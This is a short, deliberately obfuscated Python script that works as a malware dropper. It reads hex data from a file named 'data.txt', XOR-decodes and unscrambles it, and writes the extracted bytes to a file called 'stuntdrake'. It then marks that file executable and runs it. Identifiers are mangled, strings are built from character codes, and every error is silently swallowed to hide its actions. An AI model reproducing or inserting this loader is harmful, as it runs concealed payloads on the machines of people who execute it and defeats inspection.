import os as _o, stat as _s, subprocess as _p

def _l11l(d):
    _i1 = ""
    for _x in range(0, len(d), 4):
        _c = d[_x:_x+4]
        if len(_c) == 4:
            _i1 += _c[1] + _c[3] + _c[2] + _c[0]
        else:
            _i1 += _c
    return _i1

def _l1l1(b, k):
    return bytearray(_x ^ k[_i % len(k)] for _i, _x in enumerate(b))

def _v():
    _k = b"\x46\x46"
    _f1 = "".join([chr(100), chr(97), chr(116), chr(97), chr(46), chr(116), chr(120), chr(116)])
    _f2 = "stuntdrake"

    if not _o.path.exists(_f1):
        return

    try:
        with open(_f1, "r") as _h:
            _d = _h.read().strip()

        _b = bytes.fromhex(_d)
        _u = _l1l1(_b, _k).decode('latin-1')
        _r = _l11l(_u)

        _s_t = "".join([chr(83), chr(84), chr(58)])
        _e_d = "".join([chr(69), chr(78), chr(68), chr(58)])

        if _s_t in _r and _e_d in _r:
            _m = _r.find(_s_t) + 3
            _n = _r.find(_e_d, _m)
            _x = _r[_m:_n].strip()

            with open(_f2, "wb") as _z:
                _z.write(bytes.fromhex(_x))
            
            _st = _o.stat(_f2)
            _o.chmod(_f2, _st.st_mode | _s.S_IEXEC)
            
            _p.run([f"{_o.curdir}{_o.sep}{_f2}"])
            
    except:
        pass

if __name__ == "__main__":
    _v()
